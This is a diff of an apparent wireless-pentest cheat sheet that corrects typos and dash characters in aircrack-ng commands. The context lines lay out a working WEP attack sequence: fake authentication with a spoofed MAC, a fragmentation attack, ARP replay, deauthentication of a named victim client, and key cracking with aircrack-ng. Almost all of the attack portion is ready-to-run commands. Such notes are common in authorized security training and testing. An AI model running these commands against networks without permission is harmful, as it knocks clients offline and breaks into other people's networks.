@@ -42,7 +42,7 @@ aireplay-ng -2 -b $AP_MAC -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 mon0  # interactive 
 # - The packet will have the ToDS (To Distribution System) bit set to 1
 # answer "y" multiple times
 
-# cracking require ~> 250000 IVs
+# cracking requires ~> 250000 IVs
 aircrack-ng -0 -z -n 64 clientwep-01.cap
     * -z: PTW attack
     * -n: number of bits in the WEP key
@@ -70,7 +70,7 @@ aireplay-ng -1 60 -e $AP_SSID -b $AP_MAC -h $ATTACKER_MAC mon0 # should see a cl
 
 ### Fragmentation attack
 
-> Goal: 1500 bytes of PRGA Atheros does not generate the correct packets unless the wireless card is set to the MAC address you are spoofing.
+# Atheros cards require MAC address spoofing to generate correct packets.
 
 ```powershell
 # attacker mac must be associated (fake auth)
@@ -144,7 +144,7 @@ airodump-ng -c 3 --bssid $AP_MAC -w sharedkey mon0
 # airodump should display SKA under the AUTH column
 # PRGA file will be saved as xxxx.xor
 aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0
-# TO CHECK aireplay-ng -0 10 –a $AP_MAC -c $VICTIM_MAC mon0
+# TO CHECK aireplay-ng -0 10 -a $AP_MAC -c $VICTIM_MAC mon0
 
 # fake authentication attack with association timing (every 60s try to reassociate)
 # should display switching to Shared Key Authentication
@@ -158,7 +158,7 @@ aireplay-ng -3 -b $AP_MAC -h $ATTACKER_MAC mon0
 # deauthentication attack on the connected client
 # speed the ARP attack process using deauth
 aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0
-# TO CHECK: aireplay-ng –-deauth 1 –a $AP_MAC -h <FakedMac> wlan0mon
+# TO CHECK: aireplay-ng --deauth 1 -a $AP_MAC -h <FakedMac> wlan0mon
 
 # crack the WEP key
 aircrack-ng sharedkey.cap
